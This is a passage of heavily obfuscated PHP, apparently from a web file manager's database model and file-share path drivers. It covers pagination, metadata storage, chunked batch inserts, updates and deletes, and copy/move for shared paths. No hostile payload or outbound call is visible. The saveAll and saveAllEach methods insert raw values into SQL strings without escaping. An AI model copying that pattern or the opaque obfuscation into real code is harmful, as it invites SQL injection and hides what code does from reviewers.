$Ù”àÅŞ‘ = $Ù”àÅŞ‘ <= 5 ? 5 : ($Ù”àÅŞ‘ >= $éËÉ«ù ? $éËÉ«ù : $Ù”àÅŞ‘); $øı‡¯àß = intval(isset($in[$Ñò›Îö½[413]]) && $in[$Ñò›Îö½[413]] ? $in[$Ñò›Îö½[413]] : $øı‡¯àß); $øı‡¯àß = $øı‡¯àß <= 1 ? 1 : $øı‡¯àß; $€†šÀ­ = array(); $î‹Ğœíê = 1; if ($øı‡¯àß == 1 && $î‹Ğœíê) { $this->optionsValue($Ô½ÒŞÚ); $€†šÀ­ = $this->page($øı‡¯àß, $Ù”àÅŞ‘)->select(); $¾Ñ÷Î¤ù = is_array($€†šÀ­) ? count($€†šÀ­) : 0; if ($¾Ñ÷Î¤ù < $Ù”àÅŞ‘) { $Ù¢ˆ£æ° = 1; } else { $this->optionsValue($³¨«Å«); $¾Ñ÷Î¤ù = intval($this->count()); $Ù¢ˆ£æ° = ceil($¾Ñ÷Î¤ù / $Ù”àÅŞ‘); } } else { $this->optionsValue($³¨«Å«); $¾Ñ÷Î¤ù = intval($this->count()); $Ù¢ˆ£æ° = ceil($¾Ñ÷Î¤ù / $Ù”àÅŞ‘); $øı‡¯àß = $øı‡¯àß >= $Ù¢ˆ£æ° ? $Ù¢ˆ£æ° : $øı‡¯àß; $this->optionsValue($Ô½ÒŞÚ); $€†šÀ­ = $this->page($øı‡¯àß, $Ù”àÅŞ‘)->select(); } if (!is_array($€†šÀ­)) { $€†šÀ­ = array(); } if ($Ù¢ˆ£æ° == 1) { $¾Ñ÷Î¤ù = count($€†šÀ­); } $ééÎ¨¸‡ = array($Ñò›Îö½[426] => array($Ñò›Îö½[427] => $¾Ñ÷Î¤ù, $Ñò›Îö½[423] => $Ù”àÅŞ‘, $Ñò›Îö½[413] => $øı‡¯àß, $Ñò›Îö½[428] => $Ù¢ˆ£æ°), $Ñò›Îö½[429] => $€†šÀ­); return $ééÎ¨¸‡; } protected function checkLength($“–´‚°, $íË”¸Å‰ = 0, $Ò°›¬Î¥ = '') { $ÛªûÜÖ´ =& $_SERVER[Ñ¯©ç]; $íË”¸Å‰ = $íË”¸Å‰ ? $íË”¸Å‰ : 65536; if (!$“–´‚° || strlen($“–´‚°) < $íË”¸Å‰) { return; } $Ò°›¬Î¥ = $Ò°›¬Î¥ ? $Ò°›¬Î¥ . $ÛªûÜÖ´[84] : $ÛªûÜÖ´[12]; show_json($Ò°›¬Î¥ . LNG($ÛªûÜÖ´[430]) . "\x28{$íË”¸Å‰}\51", !1); } protected function metaSet($½“™ª¸, $Òˆ¸æ€° = null, $Ú›¦—îŒ = null) { $±ĞÛŞÇ =& $_SERVER[Ñ¯©ç]; if (!$this->tableMeta || !$½“™ª¸) { return !1; } $ÎÖªá–ş = $this->tableMeta[$±ĞÛŞÇ[431]]; $§œìîğ¤ = $this->tableMeta[$±ĞÛŞÇ[432]]; $Û÷Ÿ†Æ­ = Model($§œìîğ¤); $ôåÕÑ = array($ÎÖªá–ş => $½“™ª¸, $±ĞÛŞÇ[433] => $Òˆ¸æ€°); if (is_null($Òˆ¸æ€°)) { return $Û÷Ÿ†Æ­->where(array($ÎÖªá–ş => $½“™ª¸))->delete(); } if (is_null($Ú›¦—îŒ) && is_string($Òˆ¸æ€°)) { return $Û÷Ÿ†Æ­->where($ôåÕÑ)->delete(); } $Å•»‹ªø = is_array($Òˆ¸æ€°) ? $Òˆ¸æ€° : array(); if (is_string($Òˆ¸æ€°)) { $Å•»‹ªø[$Òˆ¸æ€°] = $Ú›¦—îŒ; } $ëÎÉ½ó’ = array(); foreach ($Å•»‹ªø as $òåõõ­† => $Çœè§‰) { if (is_null($Çœè§‰) && is_string($òåõõ­†)) { $Û÷Ÿ†Æ­->where(array($ÎÖªá–ş => $½“™ª¸, $±ĞÛŞÇ[433] => $òåõõ­†))->delete(); continue; } $this->checkLength($Çœè§‰, !1, $§œìîğ¤ . $±ĞÛŞÇ[4] . $òåõõ­†); $ëÎÉ½ó’[] = array($ÎÖªá–ş => $½“™ª¸, $±ĞÛŞÇ[107] => $òåõõ­†, $±ĞÛŞÇ[434] => $Çœè§‰); } $êù³° = $±ĞÛŞÇ[435] . $§œìîğ¤; CacheLock::lock($êù³°); $Û÷Ÿ†Æ­->where(array($ÎÖªá–ş => $½“™ª¸))->addAll($ëÎÉ½ó’, array(), !0); CacheLock::unlock($êù³°); return !0; } public function metaGet($·š×ŒÍ¸, $©»·Ëê« = false) { $ğ©¢ï¶ =& $_SERVER[Ñ¯©ç]; if (!$this->tableMeta) { return array(); } $ò›àŒÎâ = $this->tableMeta[$ğ©¢ï¶[431]]; $ñ›ƒÊÑ¬ = Model($this->tableMeta[$ğ©¢ï¶[432]]); if ($©»·Ëê«) { $±â²Œ¬ğ = array($ò›àŒÎâ => $·š×ŒÍ¸, $ğ©¢ï¶[107] => $©»·Ëê«); return $ñ›ƒÊÑ¬->where($±â²Œ¬ğ)->getField($ğ©¢ï¶[434]); } $±â²Œ¬ğ = array($ò›àŒÎâ => $·š×ŒÍ¸); $çÁ•„ş = $ñ›ƒÊÑ¬->field($ğ©¢ï¶[436])->where($±â²Œ¬ğ)->select(); $çÁ•„ş = array_to_keyvalue($çÁ•„ş, $ğ©¢ï¶[107], $ğ©¢ï¶[434]); return $çÁ•„ş; } private function checkDataAutoHas($¥æÙ¨Î) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $²×¯ş½±) { if (in_array($¥æÙ¨Î, explode($_SERVER[Ñ¯©ç][50], $²×¯ş½±[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Óºä’÷¢, $³›¹‡”‹) { $Ç¹À¢™¤ =& $_SERVER[Ñ¯©ç]; if (!is_array($Óºä’÷¢)) { return; } foreach ($this->dataAuto as $¬ê¯ô“) { $„ÈÈûô¢ = $¬ê¯ô“[0]; if (!in_array($³›¹‡”‹, explode($Ç¹À¢™¤[50], $¬ê¯ô“[2]))) { continue; } switch (trim($¬ê¯ô“[3])) { case $Ç¹À¢™¤[381]: case $Ç¹À¢™¤[382]: $áÈ“»  = $¬ê¯ô“[1]; $Ùş¾ƒÌú = isset($¬ê¯ô“[4]) ? (array) $¬ê¯ô“[4] : array(); if ($áÈ“»  == $Ç¹À¢™¤[207] && array_key_exists($„ÈÈûô¢, $Óºä’÷¢)) { if (!$Óºä’÷¢[$„ÈÈûô¢]) { unset($Óºä’÷¢[$„ÈÈûô¢]); } break; } if (isset($Óºä’÷¢[$„ÈÈûô¢])) { array_unshift($Ùş¾ƒÌú, $Óºä’÷¢[$„ÈÈûô¢]); } if ($Ç¹À¢™¤[381] == $¬ê¯ô“[3]) { $Óºä’÷¢[$„ÈÈûô¢] = call_user_func_array($áÈ“» , $Ùş¾ƒÌú); } else { $Óºä’÷¢[$„ÈÈûô¢] = call_user_func_array(array(&$this, $áÈ“» ), $Ùş¾ƒÌú); } break; case $Ç¹À¢™¤[331]: if (isset($Óºä’÷¢[$„ÈÈûô¢]) && $Óºä’÷¢[$„ÈÈûô¢]) { $Óºä’÷¢[$„ÈÈûô¢] = call_user_func_array(array(&$this, $¬ê¯ô“[1]), array($Óºä’÷¢[$„ÈÈûô¢])); } break; case $Ç¹À¢™¤[334]: $Óºä’÷¢[$„ÈÈûô¢] = $Óºä’÷¢[$¬ê¯ô“[1]]; break; case $Ç¹À¢™¤[354]: if (isset($Óºä’÷¢[$„ÈÈûô¢]) && !is_string($Óºä’÷¢[$„ÈÈûô¢])) { $Óºä’÷¢[$„ÈÈûô¢] = json_encode_force($Óºä’÷¢[$„ÈÈûô¢]); } break; case $Ç¹À¢™¤[383]: if ($Óºä’÷¢[$„ÈÈûô¢] === $Ç¹À¢™¤[12]) { unset($Óºä’÷¢[$„ÈÈûô¢]); } break; case $Ç¹À¢™¤[384]: $Óºä’÷¢[$„ÈÈûô¢] = $¬ê¯ô“[1]; default: break; } } if ($³›¹‡”‹ == $Ç¹À¢™¤[415]) { $ËÂ……ª® = strtolower($this->db->getDbType()); if (strpos($ËÂ……ª®, $Ç¹À¢™¤[13]) !== 0) { return; } $øêÏéÆ‡ = $this->field(!0)->fields; $¾³÷·’“ = $øêÏéÆ‡[$Ç¹À¢™¤[313]]; if (isset($øêÏéÆ‡[$Ç¹À¢™¤[312]])) { unset($¾³÷·’“[$øêÏéÆ‡[$Ç¹À¢™¤[312]]]); } foreach ($¾³÷·’“ as $ÏÏåÒ£ø => $³›¹‡”‹) { if (!isset($Óºä’÷¢[$ÏÏåÒ£ø])) { $Óºä’÷¢[$ÏÏåÒ£ø] = $Ç¹À¢™¤[12]; } } } } private function dataAfterFilter(&$Ç–ÌÂŞ•) { $¨Ø¦·Áß =& $_SERVER[Ñ¯©ç]; foreach ($this->dataAuto as $å´Ûµâê) { $€¦ä¬£Ï = $å´Ûµâê[0]; if (!isset($Ç–ÌÂŞ•[$€¦ä¬£Ï])) { continue; } if (!in_array($¨Ø¦·Áß[417], explode($¨Ø¦·Áß[50], $å´Ûµâê[2]))) { continue; } switch (trim($å´Ûµâê[3])) { case $¨Ø¦·Áß[381]: case $¨Ø¦·Áß[382]: $î½éïËˆ = isset($å´Ûµâê[4]) ? (array) $å´Ûµâê[4] : array(); array_unshift($î½éïËˆ, $Ç–ÌÂŞ•[$€¦ä¬£Ï]); if (isset($å´Ûµâê[4]) && $å´Ûµâê[4] == $¨Ø¦·Áß[437]) { $î½éïËˆ = array($Ç–ÌÂŞ•[$€¦ä¬£Ï]); } if ($¨Ø¦·Áß[381] == $å´Ûµâê[3]) { $Ç–ÌÂŞ•[$€¦ä¬£Ï] = call_user_func_array($å´Ûµâê[1], $î½éïËˆ); } else { $Ç–ÌÂŞ•[$€¦ä¬£Ï] = call_user_func_array(array(&$this, $å´Ûµâê[1]), $î½éïËˆ); } break; case $¨Ø¦·Áß[331]: if (isset($Ç–ÌÂŞ•[$€¦ä¬£Ï]) && $Ç–ÌÂŞ•[$€¦ä¬£Ï]) { $Ç–ÌÂŞ•[$€¦ä¬£Ï] = call_user_func_array(array(&$this, $å´Ûµâê[1]), array($Ç–ÌÂŞ•[$€¦ä¬£Ï])); } break; case $¨Ø¦·Áß[334]: $Ç–ÌÂŞ•[$€¦ä¬£Ï] = $Ç–ÌÂŞ•[$å´Ûµâê[1]]; break; case $¨Ø¦·Áß[354]: $ûšë¡è = $Ç–ÌÂŞ•[$€¦ä¬£Ï]; $Ç–ÌÂŞ•[$€¦ä¬£Ï] = json_decode($ûšë¡è, !0); if (is_null($Ç–ÌÂŞ•[$€¦ä¬£Ï])) { $Ç–ÌÂŞ•[$€¦ä¬£Ï] = $ûšë¡è; } break; case $¨Ø¦·Áß[383]: if ($Ç–ÌÂŞ•[$€¦ä¬£Ï] === $¨Ø¦·Áß[12]) { unset($Ç–ÌÂŞ•[$€¦ä¬£Ï]); } break; case $¨Ø¦·Áß[384]: $Ç–ÌÂŞ•[$€¦ä¬£Ï] = $å´Ûµâê[1]; break; default: break; } } } public function saveAll($’Ö®ì±Ä) { $¼ªúõí€ =& $_SERVER[Ñ¯©ç]; $´¾ƒÄş¼ = $this->tablePrefix . $this->tableName; $ªœØÂ‚Â = self::SQL_WHERE_IN_CHUNK; $’Ö®ì±Ä = is_array($’Ö®ì±Ä) ? $’Ö®ì±Ä : array(); $åÁøâ­ = $¼ªúõí€[63]; $êŞğ´Õ¨ = 0; $Ü„ÜëáÅ = array(); $â¤ø¸§ë = count($’Ö®ì±Ä); for ($Ôó²“÷ò = 0; $Ôó²“÷ò < $â¤ø¸§ë; $Ôó²“÷ò++) { $Â…ƒ’Ú¾ = $’Ö®ì±Ä[$Ôó²“÷ò]; if (!is_array($Â…ƒ’Ú¾) || count($Â…ƒ’Ú¾) != 4) { continue; } $¢”ğ —ç = "\125\x50\104\x41\x54\105\x20\140{$´¾ƒÄş¼}\x60\40\123\x45\124\40{$Â…ƒ’Ú¾[2]}\x20\75\x20\103\101\x53\105\40{$Â…ƒ’Ú¾[0]}\40\12"; if ($êŞğ´Õ¨ == 0) { $åÁøâ­ = $¢”ğ —ç; } $Ü„ÜëáÅ[] = $¼ªúõí€[131] . $Â…ƒ’Ú¾[1] . $¼ªúõí€[131]; $êŞğ´Õ¨++; $åÁøâ­ .= "\x20\127\110\x45\116\x20\47{$Â…ƒ’Ú¾[1]}\47\x20\x54\110\105\x4e\x20\47{$Â…ƒ’Ú¾[3]}\x27\40\12"; if ($êŞğ´Õ¨ == $ªœØÂ‚Â || $Ôó²“÷ò == $â¤ø¸§ë - 1) { $Ü¬ß“Â = implode($¼ªúõí€[50], $Ü„ÜëáÅ); $åÁøâ­ .= "\x20\x45\116\x44\40\40\127\x48\x45\x52\x45\x20{$Â…ƒ’Ú¾[0]}\40\111\x4e\x20\50{$Ü¬ß“Â}\51\x20"; $this->execute($åÁøâ­); $êŞğ´Õ¨ = 0; $åÁøâ­ = $¢”ğ —ç; $this->chunkEventCheck(count($Ü„ÜëáÅ)); $Ü„ÜëáÅ = array(); } } $this->chunkEventSet(); } public function saveAllEach($Èí·µıû) { $ØÍ†áÉÏ =& $_SERVER[Ñ¯©ç]; $Ùô¹éÁ± = $this->tablePrefix . $this->tableName; foreach ($Èí·µıû as $§²“âß) { if (!is_array($§²“âß) || count($§²“âß) != 4) { continue; } $Æ„ÏÁÆ„ = $§²“âß[0] . $ØÍ†áÉÏ[438] . $§²“âß[1] . $ØÍ†áÉÏ[131]; $ˆßåö’² = $§²“âß[2] . $ØÍ†áÉÏ[438] . $§²“âß[3] . $ØÍ†áÉÏ[131]; $æâ‰¥ì­ = "\165\x70\144\x61\x74\145\x20{$Ùô¹éÁ±}\x20\163\x65\x74\x20{$ˆßåö’²}\x20\167\150\145\162\x65\40{$Æ„ÏÁÆ„}\x3b"; $this->execute($æâ‰¥ì­); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ó–ĞğÆ† = false, $ôÊµãíê = false) { $this->_chunkEvent = $ó–ĞğÆ†; $this->_chunkEventParam = $ôÊµãíê; } private function chunkEventCheck($–İòÅ¢) { if (!$this->_chunkEvent) { return; } $‹ÓôáÇó = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $‹ÓôáÇó[$_SERVER[Ñ¯©ç][439]] = $–İòÅ¢; Hook::trigger($this->_chunkEvent, $‹ÓôáÇó); } public function addAll($ƒ°–ò, $²¨«éƒ = array(), $Ä¢ö¥å‡ = false) { $áÄöïç— =& $_SERVER[Ñ¯©ç]; ignore_timeout(); $ó¤ë¾ = self::SQL_WHERE_IN_CHUNK; if (empty($ƒ°–ò)) { $this->error = think_lang($áÄöïç—[332]); return !1; } $²¨«éƒ = $this->_parseOptions($²¨«éƒ); foreach ($ƒ°–ò as $–àıæ¶Ú => $›ïÛù¹«) { $ƒ°–ò[$–àıæ¶Ú] = $this->_facade($›ïÛù¹«); $this->_beforeInsert($ƒ°–ò[$–àıæ¶Ú], $²¨«éƒ); } if (method_exists($this->db, $áÄöïç—[333])) { for ($Çã¹ú·’ = 0; $Çã¹ú·’ < count($ƒ°–ò); $Çã¹ú·’ += $ó¤ë¾) { $‰Í½Ùõº = array_slice($ƒ°–ò, $Çã¹ú·’, $ó¤ë¾); if (!is_array($‰Í½Ùõº) || count($‰Í½Ùõº) == 0) { break; } $ÎÌÑôì = $this->db->insertAll($‰Í½Ùõº, $²¨«éƒ, $Ä¢ö¥å‡); $this->chunkEventCheck(count($‰Í½Ùõº)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ƒ°–ò as $–àıæ¶Ú => $›ïÛù¹«) { $ÎÌÑôì = $this->db->insert($›ïÛù¹«, $²¨«éƒ, $Ä¢ö¥å‡); } $this->commit(); } if (!1 !== $ÎÌÑôì) { $öÆó¿Ş× = $this->getLastInsID(); if ($öÆó¿Ş×) { return $öÆó¿Ş×; } } return $ÎÌÑôì; } public function save($ìåá² = '', $«Øå­Ñ = array()) { $ƒÙ¯øË† =& $_SERVER[Ñ¯©ç]; $›çÒ’ß„ = self::SQL_WHERE_IN_CHUNK; $³’Ò¼Í¸ = $this->optionsValue(); $¤Í†œ¿ß = $this->findWhereField($³’Ò¼Í¸); if (!$¤Í†œ¿ß) { return parent::save($ìåá², $«Øå­Ñ); } $¼ûÃØ›¥ = 0; $»üÓâ… = $³’Ò¼Í¸[$ƒÙ¯øË†[336]][$¤Í†œ¿ß][1]; $»üÓâ… = is_array($»üÓâ…) ? $»üÓâ… : array(); $ìÙ¯¨¹ = count($»üÓâ…); for ($æÊÊ®ã = 0; $æÊÊ®ã < $ìÙ¯¨¹; $æÊÊ®ã += $›çÒ’ß„) { $ûˆ½âƒ÷ = array_slice($»üÓâ…, $æÊÊ®ã, $›çÒ’ß„); if (!is_array($ûˆ½âƒ÷) || count($ûˆ½âƒ÷) == 0) { break; } $³’Ò¼Í¸[$ƒÙ¯øË†[336]][$¤Í†œ¿ß][1] = $ûˆ½âƒ÷; $this->optionsValue($³’Ò¼Í¸); $¼ûÃØ›¥ += parent::save($ìåá², $«Øå­Ñ); $this->chunkEventCheck(count($ûˆ½âƒ÷)); } $this->chunkEventSet(); return $¼ûÃØ›¥; } public function add($ÄïÏ€€ = '', $š©ˆ¸Å = array(), $‹ûà€±º = false) { if ($this->addTaskStatus && is_array($ÄïÏ€€)) { $this->addTaskData[] = $ÄïÏ€€; return; } return parent::add($ÄïÏ€€, $š©ˆ¸Å, $‹ûà€±º); } public function parseWhereLike($Ç»½Ü ®, $×ì¿°Èù = '', $Š‹ÚÂ“â = false, &$“¼² šÅ = false) { $ã†äíö =& $_SERVER[Ñ¯©ç]; $«›òúÀı = $GLOBALS[$ã†äíö[6]][$ã†äíö[440]]; if (!$«›òúÀı[$ã†äíö[441]]) { return $Ç»½Ü ®; } if (!is_array($Ç»½Ü ®)) { return $Ç»½Ü ®; } $Ë·ı³ì = array(); $¨Şøäğ¿ = 0; foreach ($Ç»½Ü ® as $®¶¢åğã => $„Şè”î³) { if (is_array($„Şè”î³) && count($„Şè”î³) == 2 && $„Şè”î³[0] == $ã†äíö[442] && is_string($„Şè”î³[1]) && substr($„Şè”î³[1], 0, 1) == $ã†äíö[443] && substr($„Şè”î³[1], strlen($„Şè”î³[1]) - 1, 1) == $ã†äíö[443]) { $“¼² šÅ = !0; $ˆõİñ = is_string($®¶¢åğã) ? $®¶¢åğã : $×ì¿°Èù; $Ú×çŒ…¸ = substr($„Şè”î³[1], 1, strlen($„Şè”î³[1]) - 2); $Ú×çŒ…¸ = $this->db->escapeString($Ú×çŒ…¸); if (!strpos($ˆõİñ, $ã†äíö[10])) { $ˆõİñ = $ã†äíö[444] . $ˆõİñ . $ã†äíö[444]; } $¬ìñœ®€ = $ã†äíö[221] . $Ú×çŒ…¸ . $ã†äíö[221]; $Ú×çŒ…¸ = str_replace(array($ã†äíö[10], $ã†äíö[445], $ã†äíö[11]), $ã†äíö[446], $Ú×çŒ…¸); if ($«›òúÀı[$ã†äíö[447]]) { $¬ìñœ®€ = $ã†äíö[448] . $Ú×çŒ…¸ . $ã†äíö[449]; if ($«›òúÀı[$ã†äíö[450]]) { $¬ìñœ®€ = $ã†äíö[449] . $Ú×çŒ…¸ . $ã†äíö[448]; } } $Ë·ı³ì[$¨Şøäğ¿] = $ã†äíö[451] . $ˆõİñ . $ã†äíö[452] . $¬ìñœ®€ . $ã†äíö[453]; $¨Şøäğ¿++; continue; } if (is_array($„Şè”î³)) { $×ì¿°Èù = is_string($®¶¢åğã) ? $®¶¢åğã : $×ì¿°Èù; $„Şè”î³ = $this->parseWhereLike($„Şè”î³, $×ì¿°Èù, !0, $“¼² šÅ); } if (is_numeric($®¶¢åğã)) { $Ë·ı³ì[$¨Şøäğ¿] = $„Şè”î³; $¨Şøäğ¿++; } else { $Ë·ı³ì[$®¶¢åğã] = $„Şè”î³; } } if ($“¼² šÅ && !$Š‹ÚÂ“â) { } return $Ë·ı³ì; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Ãâšî¼Ã = array()) { $¹¬”íôÓ =& $_SERVER[Ñ¯©ç]; $îêÅûœğ = self::SQL_WHERE_IN_CHUNK; $Ê„·Ñå = $this->optionsValue(); $ÃâáÒê = $this->findWhereField($Ê„·Ñå); if (!$ÃâáÒê || isset($Ê„·Ñå[$¹¬”íôÓ[352]]) || isset($Ê„·Ñå[$¹¬”íôÓ[413]])) { return parent::select($Ãâšî¼Ã); } $ÒÍßºàå = $Ê„·Ñå[$¹¬”íôÓ[336]][$ÃâáÒê][1]; $ÒÍßºàå = is_array($ÒÍßºàå) ? $ÒÍßºàå : array(); $æ³£á½ü = null; for ($»Êøç£è = 0; $»Êøç£è < count($ÒÍßºàå); $»Êøç£è += $îêÅûœğ) { $­¯û¤İ = array_slice($ÒÍßºàå, $»Êøç£è, $îêÅûœğ); if (!is_array($­¯û¤İ) || count($­¯û¤İ) == 0) { break; } $Ê„·Ñå[$¹¬”íôÓ[336]][$ÃâáÒê][1] = $­¯û¤İ; $this->optionsValue($Ê„·Ñå); $”«ÃÜ‡Ô = parent::select($Ãâšî¼Ã); if (!$”«ÃÜ‡Ô) { continue; } $æ³£á½ü = is_array($æ³£á½ü) ? $æ³£á½ü : array(); $æ³£á½ü = array_merge($æ³£á½ü, $”«ÃÜ‡Ô); } return $æ³£á½ü; } public function delete($šó½î‡ = array()) { $ø³€Ÿ•Ä =& $_SERVER[Ñ¯©ç]; $şíø£¶ø = self::SQL_WHERE_IN_CHUNK; $Û†°Ã› = $this->optionsValue(); $êîıı¿² = $this->findWhereField($Û†°Ã›); if (!$êîıı¿²) { return parent::delete($šó½î‡); } $éµä‘Ë = 0; $¿ Ó˜Ö– = $Û†°Ã›[$ø³€Ÿ•Ä[336]][$êîıı¿²][1]; $¿ Ó˜Ö– = is_array($¿ Ó˜Ö–) ? $¿ Ó˜Ö– : array(); for ($„¨–¾Üû = 0; $„¨–¾Üû < count($¿ Ó˜Ö–); $„¨–¾Üû += $şíø£¶ø) { $Ç°õ¢¡ = array_slice($¿ Ó˜Ö–, $„¨–¾Üû, $şíø£¶ø); if (!is_array($Ç°õ¢¡) || count($Ç°õ¢¡) == 0) { break; } $Û†°Ã›[$ø³€Ÿ•Ä[336]][$êîıı¿²][1] = $Ç°õ¢¡; $this->optionsValue($Û†°Ã›); $éµä‘Ë += parent::delete($šó½î‡); } return $éµä‘Ë; } private function findWhereField($ÇôïØˆ) { $À»ôÊí =& $_SERVER[Ñ¯©ç]; $ÏÈ°‘–„ = self::SQL_WHERE_IN_CHUNK; if (!is_array($ÇôïØˆ) || !is_array($ÇôïØˆ[$À»ôÊí[336]])) { return !1; } foreach ($ÇôïØˆ[$À»ôÊí[336]] as $ÍàÃ¸® => $ñû©˜ß) { if (is_array($ñû©˜ß) && isset($ñû©˜ß[0]) && is_string($ñû©˜ß[0]) && strtolower($ñû©˜ß[0]) == $À»ôÊí[7] && is_array($ñû©˜ß[1]) && count($ñû©˜ß[1]) > $ÏÈ°‘–„) { ignore_timeout(); return $ÍàÃ¸®; } } return !1; } public function setMasterDB($Òİ•ÛêË = true) { think_config($_SERVER[Ñ¯©ç][454], $Òİ•ÛêË); } } goto E™ŸêÅÈƒ»; D˜’šÌ¿ô³: class PathDriverDbShareItem extends PathDriverDB { public function __construct($­ò›Ğğù) { $this->pathParse = $­ò›Ğğù; $this->model = Model($_SERVER[Ñ¯©ç][1391]); } public function getPathOuter($ÁÈË‰œ) { $—çşÙ¶ğ =& $_SERVER[Ñ¯©ç]; if (!$ÁÈË‰œ) { return $ÁÈË‰œ; } $û”ãÂ«ú = $this->parse($ÁÈË‰œ); return trim(KodIO::makeShare($this->pathParse[$—çşÙ¶ğ[458]], $û”ãÂ«ú[$—çşÙ¶ğ[458]]), $—çşÙ¶ğ[8]); } protected function infoParse($ñÓïƒÄô, $Öæšàù = false, $ïÀ¡êá© = false) { $‹ç›¿ö =& $_SERVER[Ñ¯©ç]; $é¾éé = $this->pathParse[$‹ç›¿ö[458]]; $Ü÷™İ„ = trim($this->pathParse[$‹ç›¿ö[1225]], $‹ç›¿ö[8]); return Action($‹ç›¿ö[1398])->sharePathInfo($é¾éé, $Ü÷™İ„, $Öæšàù); } public function infoFull($ı–æ¶È) { $ÒüÙ“ó· =& $_SERVER[Ñ¯©ç]; $³ŠòÜÖô = explode($ÒüÙ“ó·[8], trim($ı–æ¶È, $ÒüÙ“ó·[8])); if (count($³ŠòÜÖô) > 1) { $‰¿¹‘åŞ = implode($ÒüÙ“ó·[8], array_splice($³ŠòÜÖô, 1)); $–ÜÆÁÎì = $this->model->pathInfoByPath($³ŠòÜÖô[0], $‰¿¹‘åŞ); if (!$–ÜÆÁÎì) { return !1; } $this->pathParse[$ÒüÙ“ó·[1225]] = $–ÜÆÁÎì[$ÒüÙ“ó·[194]]; } return $this->infoParse($ı–æ¶È); } public function listAll($şô´¶äª) { $‡èøöÚÈ =& $_SERVER[Ñ¯©ç]; $§µ¤÷µÛ = IO::info($this->pathParse[$‡èøöÚÈ[97]]); if (!$§µ¤÷µÛ) { return array(); } $¶Ş²ïÇÍ = $this->model->listAll($şô´¶äª); $âÕ©ËŠ = Model($‡èøöÚÈ[647])->getInfo($§µ¤÷µÛ[$‡èøöÚÈ[648]]); foreach ($¶Ş²ïÇÍ as &$¯ó¿ŞÛÍ) { check_abort(); $¯ó¿ŞÛÍ[$‡èøöÚÈ[100]] = Action($‡èøöÚÈ[1398])->_shareItemeParse($¯ó¿ŞÛÍ[$‡èøöÚÈ[100]], $âÕ©ËŠ); } unset($¯ó¿ŞÛÍ); return $¶Ş²ïÇÍ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($æÑ¾úûª) { $this->pathParse = $æÑ¾úûª; $this->model = Model($_SERVER[Ñ¯©ç][1391]); } protected function infoParse($İ×¼ÑÊ¹, $¡±ÇÜ­ = false, $±ßæŠÔĞ = false) { $ÛìÙŸé =& $_SERVER[Ñ¯©ç]; return Action($ÛìÙŸé[1231])->sharePathInfo($this->pathParse[$ÛìÙŸé[97]], !0, $¡±ÇÜ­); } public function listPath($Ü˜‚™—¯, $İêûúœÇ = false) { $É¡ù×ÆÔ =& $_SERVER[Ñ¯©ç]; $¢Åôˆ¼¯ = parent::listPath($Ü˜‚™—¯, $İêûúœÇ); if (!$¢Åôˆ¼¯) { return $¢Åôˆ¼¯; } if (is_array($¢Åôˆ¼¯[$É¡ù×ÆÔ[1399]])) { $¢Åôˆ¼¯[$É¡ù×ÆÔ[1399]] = Action($É¡ù×ÆÔ[1231])->shareItemInfo($¢Åôˆ¼¯[$É¡ù×ÆÔ[1399]]); } foreach ($¢Åôˆ¼¯ as $±›ª¼ğ® => $´èœó¹) { if (!in_array($±›ª¼ğ®, array($É¡ù×ÆÔ[96], $É¡ù×ÆÔ[95]))) { continue; } foreach ($´èœó¹ as $Ú¥çÄãÈ => $–„ˆ¬—») { $¢Åôˆ¼¯[$±›ª¼ğ®][$Ú¥çÄãÈ] = Action($É¡ù×ÆÔ[1231])->shareItemInfo($–„ˆ¬—»); } } return $¢Åôˆ¼¯; } public function listAll($Á¢ÄåáŞ) { $ù·Ö›¼ú =& $_SERVER[Ñ¯©ç]; $×Õ‡™§” = IO::info($this->pathParse[$ù·Ö›¼ú[97]]); if (!$×Õ‡™§”) { return array(); } $î¦àğã¿ = $this->model->listAll($Á¢ÄåáŞ); foreach ($î¦àğã¿ as &$™ªÙ›º•) { $™ªÙ›º•[$ù·Ö›¼ú[100]] = Action($ù·Ö›¼ú[1231])->shareItemInfo($™ªÙ›º•[$ù·Ö›¼ú[100]]); } unset($™ªÙ›º•); return $î¦àğã¿; } } class PathDriverDriverShareItem { public function __construct($œÔ¿ñçÉ) { $this->pathParse = $œÔ¿ñçÉ; } public function __call($ÓØşÏÏ¨, $­Å³ÁŸİ) { $ĞêöàÛ =& $_SERVER[Ñ¯©ç]; if (method_exists($this, $ÓØşÏÏ¨)) { return; } $úÚöüË = call_user_func_array(array($ĞêöàÛ[1400], $ÓØşÏÏ¨), $­Å³ÁŸİ); $úğß¬› = array($ĞêöàÛ[1401], $ĞêöàÛ[1402], $ĞêöàÛ[1403], $ĞêöàÛ[1404], $ĞêöàÛ[601], $ĞêöàÛ[603], $ĞêöàÛ[1405], $ĞêöàÛ[120], $ĞêöàÛ[1406], $ĞêöàÛ[1407]); if (in_array($ÓØşÏÏ¨, $úğß¬›)) { $úÚöüË = $this->getPathOuter($úÚöüË); } return $úÚöüË; } public function copy($ƒÊÊ·å, $©éÆÃÇñ, $ à¸õÙ¨ = false, $¯ŞÇ…¶” = false) { return $this->copyMove($ƒÊÊ·å, $©éÆÃÇñ, $ à¸õÙ¨, $_SERVER[Ñ¯©ç][601], $¯ŞÇ…¶”); } public function move($ëí‚ı¬„, $ÒáËò¡«, $ÃŠôò’ò = false, $½³²üô = false) { return $this->copyMove($ëí‚ı¬„, $ÒáËò¡«, $ÃŠôò’ò, $_SERVER[Ñ¯©ç][603], $½³²üô); } private function copyMove($Ÿ©®×Î, $ˆ¯ÑÊÆÁ, $¤Àˆä¢é, $•óâÊ‘Â, $úÀ¢µ© = false) { $‘·Şğö† =& $_SERVER[Ñ¯©ç]; $Ô°Œ­ = $ˆ¯ÑÊÆÁ; $Ê‰ÈÚôı = IO::driverMake($ˆ¯ÑÊÆÁ); if ($Ê‰ÈÚôı->pathParse[$‘·Şğö†[1207]]) { $ˆ¯ÑÊÆÁ = $Ê‰ÈÚôı->pathParse[$‘·Şğö†[1207]]; } else { 